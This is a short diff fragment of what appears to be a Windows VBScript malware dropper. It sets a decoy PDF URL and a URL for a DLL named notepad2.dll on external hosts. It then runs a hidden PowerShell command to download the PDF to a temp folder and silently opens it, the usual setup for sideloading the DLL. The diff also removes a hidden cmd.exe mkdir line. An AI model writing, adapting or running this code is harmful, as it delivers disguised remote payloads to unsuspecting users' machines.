@@ -22,8 +22,7 @@
         pdfUrl = "https://gnm7856.github.io/tomr/sample.pdf"
         pdfLocal = tempDir & "\sample.pdf"
         dllUrl = "https://raw.githubusercontent.com/bhekinko/test/main/notepad2.dll"
-        dllPath = tempDir & "\notepad2.dll"        
-        objShell.Run "cmd.exe /c mkdir """ & targetDir & """ >nul 2>&1", 0, True      
+        dllPath = tempDir & "\notepad2.dll"
         WScript.Sleep 2000     
         objShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '" & pdfUrl & "' -OutFile '" & pdfLocal & "'""", 0, True
         objShellApp.ShellExecute pdfLocal, "", "", "open", 0
